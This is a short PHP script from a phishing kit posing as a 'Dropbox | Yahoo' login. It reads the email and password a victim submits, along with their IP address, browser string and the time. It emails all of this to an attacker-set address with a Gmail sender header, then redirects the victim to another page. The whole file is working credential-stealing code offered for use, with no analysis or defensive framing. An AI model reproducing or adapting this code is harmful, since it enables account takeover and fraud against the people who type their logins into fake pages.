<?
include('././email.php');
include('./phpmail/mailer.php');
$ip = getenv("REMOTE_ADDR");
//+++++++++++++++++++++++++++++++// ISI PESAN \\+++++++++++++++++++++++++++++++\\
$message ="
.++--------------[ Dropbox| Yahoo Info ]--------------++.
Email          :  ".$_POST['Emailyahoo']."
Password       :  ".$_POST['Passwdyahoo']."

From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

++=============[ $$ Reult Good $$ ]==============++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$subject = "From IP : $ip";
$headers = "From: Yahoo Result $ip <antcopratae22@gmail.com>";
mail($emailku, $subject, $message, $headers);
header("Location: SS.html");
?>
